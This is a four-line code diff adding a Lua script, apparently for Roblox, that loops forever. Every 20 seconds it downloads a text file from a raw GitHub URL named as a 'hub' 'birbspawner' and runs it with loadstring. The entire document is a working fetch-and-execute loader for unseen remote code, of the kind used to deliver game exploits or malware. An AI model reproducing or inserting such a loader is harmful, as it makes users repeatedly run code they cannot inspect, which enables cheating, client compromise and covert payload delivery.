@@ -1,0 +1,4 @@
+while true do
+   wait(20)
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Eukard/eukards-hub-revived/refs/heads/main/birbspawner.txt"))()
+end
